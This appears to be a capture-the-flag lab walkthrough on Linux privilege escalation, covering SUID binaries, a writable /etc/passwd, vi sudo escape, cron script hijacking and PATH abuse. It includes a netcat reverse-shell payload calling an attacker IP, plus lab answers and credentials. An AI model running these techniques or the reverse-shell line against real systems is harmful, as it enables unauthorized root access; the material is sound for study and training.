Task 3  Direction of Privilege Escalation
------------------------------------------

#### Privilege Tree:

![](pic1.png?raw=true)


**There are two main privilege escalation variants**:

***Horizontal privilege escalation***: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

Contrary to vertical privilege escalation, lateral movement is a form of horizontal privilege escalation.


***Vertical privilege escalation (privilege elevation)***: This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]


Task4: Enumeration
-------------------

Everything are same as the [03.Linux PrivEsc] room...


1. First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

2. What is the target's hostname?

--> polobox

3. Look at the output of /etc/passwd how many "user[x]" are there on the system?

```
$ cat -n /etc/passwd | grep -E user[0-9]
```
--> 8

4. How many available shells are there on the system?

```
$ cat /etc/shells
```
--> 4

5. What is the name of the bash script that is set to run every 5 minutes by cron?

--> autoscript.sh

6. What critical file has had its permissions changed to allow some users to write to it?

--> /etc/passwd

7. Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!


Task5:  Abusing SUID/GUID Files
--------------------------------

1. What is the path of the file in user3's directory that stands out to you?

--> /home/user3/shell

2. We can do this by running: "./shell"

```
$ ls -l shell
-rwsr-xr-x 1 root root 8392 Jun  4  2019 shell
```

3. Congratulations! You should now have a shell as root user, well done!


Task:6  Exploiting Writeable /etc/passwd
-----------------------------------------

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"


2. Having read the information above, what direction privilege escalation is this attack?

---> vertical

Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: `"openssl passwd -1 -salt [salt] [password]"`


3. What is the hash created by using this command with the salt, "new" and the password "123"?

--> $1$new$p7ptkEKU1HnaHpRtzNizS1

4. Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

--> `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

5. Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

6. Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!


Task7:  Escaping Vi Editor
---------------------------

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"

2. Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

--> NOPASSWD

3. So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

4. Now, type ":!sh" to open a shell!


Task8:  Exploiting Crontab
---------------------------

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"

2. Now, on our host machine- let's create a payload for our cron exploit using msfvenom. 

3. What is the flag to specify a payload in msfvenom?

--> -p

4. Create a payload using: "**msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R**"

--> Created payload: `mkfifo /tmp/vmpspfp; nc 10.8.112.253 8888 0</tmp/vmpspfp | /bin/sh >/tmp/vmpspfp 2>&1; rm /tmp/vmpspfp`


5. What directory is the "autoscript.sh" under?

--> /home/user4/Desktop

6. Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

7. After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvnp 8888" and wait for our shell to land!

8. After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!



Task 9  Exploiting PATH Variable
---------------------------------

1. Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"


2. Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

--> ls

3. Now we know what command to imitate, let's change directory to "tmp". 

4. Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

echo "[whatever command we want to run]" > [name of the executable we're imitating]

What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating

--> `echo "/bin/bash" > ls`


5. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?

--> chmod +x ls

6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "**ls**" stored! We do this using the command "**export PATH=/tmp:$PATH**"

Note, this will cause you to open a bash prompt every time you use "**ls**". If you need to use "**ls**" before you finish the exploit, use "**/bin/ls**" where the real "**ls**" executable is.

Once you've finished the exploit, you can exit out of root and use "**export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH**" to reset the PATH variable back to default, letting you use "ls" again!


7. Now, change directory back to user5's home directory.

8. Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!



Task 10  Expanding Your Knowledge
----------------------------------

Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.

- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)


